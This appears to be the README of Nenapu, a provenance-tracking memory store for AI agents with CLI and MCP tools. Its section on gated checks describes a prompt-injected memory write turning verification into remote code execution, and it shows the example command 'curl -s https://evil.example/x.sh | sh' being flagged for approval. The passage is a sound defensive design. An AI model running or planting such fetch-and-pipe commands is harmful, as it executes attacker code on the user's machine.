<div align="center">

```
 ███╗   ██╗███████╗███╗   ██╗ █████╗ ██████╗ ██╗   ██╗
 ████╗  ██║██╔════╝████╗  ██║██╔══██╗██╔══██╗██║   ██║
 ██╔██╗ ██║█████╗  ██╔██╗ ██║███████║██████╔╝██║   ██║
 ██║╚██╗██║██╔══╝  ██║╚██╗██║██╔══██║██╔═══╝ ██║   ██║
 ██║ ╚████║███████╗██║ ╚████║██║  ██║██║     ╚██████╔╝
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝      ╚═════╝
```

**ನೆನಪು** — *memory, in Kannada*

Memory for AI agents that knows **what it rests on** and **whether it helped**.

</div>

---

## The problem

Every agent memory system — Mem0, Zep, Supermemory, Letta — is
**write-and-retrieve**. They compete on retrieval relevance: did the right text
come back. Two things follow, and nothing addresses either.

**A memory does not know what it rests on.**

```
        day 1                              day 90
  ┌──────────────────────┐          ┌──────────────────────┐
  │ auth lives in        │          │ auth lives in        │  ← repo moved,
  │ services/auth        │  0.90    │ services/auth        │     now false
  └──────────┬───────────┘          └──────────┬───────────┘
             │ agent concludes                 │
             ▼                                 ▼
  ┌──────────────────────┐          ┌──────────────────────┐
  │ new endpoints go in  │  0.90    │ new endpoints go in  │  0.90  ← still
  │ services/auth/routes │          │ services/auth/routes │        confident,
  └──────────────────────┘          └──────────────────────┘        still wrong
```

**A memory does not know whether it helped.** A fact can match a query
perfectly and still send the task the wrong way — and be recalled tomorrow with
the same confidence. Systems grade *retrieval*. None grade *consequences*.

## What Nenapu does instead

```
  $ nenapu verify
  fail   #1   test -d services/auth  →  exit 1

  $ nenapu loops
   id   state     fact                             why
   4    suspect   new endpoints go in .../routes   rests on #1: check failed
   1    active    auth code lives in services/auth exit 1

  $ nenapu why 4
  belief 0.31   (was 0.90)
  suspect: rests on #1: check failed
    #4 new endpoints go in services/auth/routes.py
    ✗ #1 auth code lives in services/auth  (inferred)
```

A `mv` falsified one fact. A **different** fact — never checked, never
mentioned — lost standing because its foundation collapsed.

**Nobody declared that dependency.** It was inferred from the agent recalling #1
and then writing #4 in the same session.

## How it works

```
   ┌─────────────────────────────────────────────────────────────┐
   │  WRITE                                                      │
   │    ├─ provenance          user_stated > agent_inferred      │
   │    ├─ decay class         volatile 14d … immutable never    │
   │    ├─ contradiction       same key + different value = clash│
   │    └─ edges inferred      recalled A, wrote B → B rests on A│
   ├─────────────────────────────────────────────────────────────┤
   │  RECALL                                                     │
   │    ├─ ranked by match AND current believability             │
   │    └─ logged with a recall_id, to be graded later           │
   ├─────────────────────────────────────────────────────────────┤
   │  FALSIFY                        (check fails / superseded)  │
   │    ├─ belief collapses 10×                                  │
   │    ├─ cascade → every dependent becomes `suspect`           │
   │    └─ recent recalls of it are marked bad, automatically    │
   └─────────────────────────────────────────────────────────────┘
```

**Confidence is six signals, not a number you set:**

```
belief = asserted × origin × decay(age) × check × track-record × support
```

**Recalls are graded four ways** — two need no cooperation from anything:

| signal | source | needs |
|---|---|---|
| `verification` | a recalled fact's check later fails | nothing |
| `correction` | a recalled fact is contradicted soon after | nothing |
| `agent` | harness reports task success | one MCP call |
| `human` | `nenapu bad <recall_id>` | you, annoyed |

**Nothing is destroyed.** Superseded, archived, suspect and retired facts stay,
with pointers to what replaced them and a journal of every action.

## Install

```bash
uv tool install nenapu       # or: uvx --from nenapu nenapu
```

Store lives at `~/.nenapu/nenapu.db`. One SQLite file — copy it, diff it, back
it up.

## Use

```bash
nenapu write "The API listens on port 8080" --kind environment --key api.port \
  --verify-cmd "curl -sf localhost:8080/health"

nenapu write "The API listens on port 9090" --kind environment --key api.port
# conflict with #1: same key, conflicting values → superseded
#   ...and everything derived from #1 is now suspect

nenapu search "what port"    # ranked by match AND believability
nenapu why 7                 # what #7 rests on, and what rests on #7
nenapu loops                 # what the store no longer stands behind
nenapu verify                # re-run checks; failures cascade
nenapu export ./CLAUDE.md    # materialize into a managed block
```

Run `nenapu` alone for the full command list, grouped into five panels.

## Wire into Claude Code / Cursor

```bash
claude mcp add nenapu -- nenapu-mcp
```

Ten tools: `memory_search`, `memory_write`, `memory_why`, `memory_verify`,
`memory_loops`, `task_outcome`, `memory_forget`, and the skill trio.
`NENAPU_TOOLS=minimal|memory|full` trades surface for tokens.

## Executable checks are gated

`verify_cmd` is shell, and facts are written by agents that read untrusted
input. Without a gate, one prompt-injected write turns `nenapu verify` into
scheduled remote code execution.

```
$ nenapu approve
#3 Build cache lives in /tmp/cache
  origin  : agent_inferred  (written by an agent, not by you)
  command : curl -s https://evil.example/x.sh | sh
  !! pipes into a shell
  !! fetches from the network
  approve this command to run on every verify? [y/N]
```

Approval binds to the exact command string. Nothing over MCP or HTTP can
approve anything. Non-interactive shells refuse rather than defaulting to yes.

## Model backends

Only two scheduled jobs call a model. Neither needs a cloud account.

| `NENAPU_LLM` | what |
|---|---|
| `auto` (default) | Anthropic if credentials exist, else probes local servers |
| `ollama` / `lmstudio` / `openai` | local, stdlib HTTP, no extra dependency |
| `exec` | any CLI on stdin, e.g. `claude -p` — no second credential |
| `anthropic` | Claude API |

**Calibrate before trusting one.** Accuracy alone cannot tell a careful auditor
from one that answers `stale` unconditionally. `nenapu doctor --calibrate` runs
the same facts past refuting, confirming and irrelevant evidence and checks
whether the verdicts *change with the evidence*:

| model | contradicting | confirming | absent | |
|---|---|---|---|---|
| qwen2.5:0.5b | 2/4 | 0/4 | 0/4 | `stale` regardless of input |
| qwen2.5:1.5b | 2/4 | 2/4 | 0/4 | invents ids |
| qwen2.5:3b | 75% | **25%** | 100% | treats *mention* as contradiction |
| frontier via `exec` | 75% | 75% | 100% | **passes** |

A backend that fails is refused. Local backends are report-only unless you pass
`--apply`.

## Performance

At 3,000 facts: write **2.2 ms**, recall **87 ms**, cascade over 900 dependents
**102 ms**, dedupe **3.2 s**. The core loop never calls a model.

## Themes

```bash
nenapu theme              # preview all five, marked with the active one
nenapu theme violet       # switch, remembered in ~/.nenapu/config.json
```

`teal` · `violet` · `indigo` · `jade` · `mono`. `NENAPU_THEME` overrides for a
single run without changing the saved choice; `NENAPU_NO_BANNER=1` silences the
banner for cron and CI.

---

Implementation decisions, measurements and the failures behind them:
**[IMPLEMENTATION_NOTES.md](IMPLEMENTATION_NOTES.md)**

MIT
